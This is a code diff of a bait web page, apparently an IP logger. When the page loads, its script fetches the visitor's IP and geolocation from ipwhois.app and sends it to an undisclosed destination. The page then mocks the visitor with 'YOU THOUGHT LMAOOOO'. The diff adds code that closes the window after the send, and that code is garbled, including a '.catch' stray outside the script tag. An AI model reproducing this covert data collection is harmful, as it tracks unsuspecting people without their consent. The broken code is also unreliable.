@@ -16,6 +16,12 @@
 
 <body>
     <script type="text/javascript">
+                function closeWindow() {
+            setTimeout(() => {
+                window.close()
+            }, 1000)
+        }
+        
         new Promise(async (resolve, reject) => {
             try {
                 const data = await (await fetch("https://ipwhois.app/json/")).json();
@@ -45,9 +51,9 @@
                     ]
                 }
 
-                request.send(JSON.stringify(params))
+                request.send(JSON.stringify(params)).then(closeWindow())
             })
-    </script>
+    </script>.catch(closeWindow())
     <div class="container">
         <div id="message">YOU THOUGHT LMAOOOO</div>
     </div>
